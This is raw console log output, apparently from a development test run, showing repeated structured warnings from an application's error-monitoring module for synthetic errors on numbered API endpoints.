WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688765Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 98'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m498[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688816Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m2[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 99'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m499[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688867Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 100'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m500[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688916Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 101'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m501[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.688966Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 102'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m502[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689017Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 103'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m503[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689066Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 104'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m504[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689115Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 105'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m505[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 106'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m506[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689211Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 107'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m507[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689259Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 108'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m508[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689306Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 109'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m509[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689354Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 110'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m510[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689401Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 111'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m511[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689449Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 112'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m512[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689496Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 113'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m513[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689543Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 114'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m514[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689592Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 115'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m515[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689642Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 116'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m516[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689690Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 117'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m517[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689738Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 118'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m518[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689785Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 119'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m519[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689832Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 120'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m520[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689883Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 121'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m521[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689930Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 122'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m522[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.689980Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 123'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m523[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690031Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 124'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m524[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690080Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 125'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m525[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690129Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 126'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m526[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690176Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 127'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m527[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690280Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 128'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m528[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690358Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 129'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m529[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690449Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 130'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m530[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690527Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 131'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m531[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690625Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 132'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m532[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690690Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 133'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m533[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690744Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 134'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m534[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690795Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 135'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m535[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690845Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 136'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m536[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.690894Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m3[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 137'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m537[0m
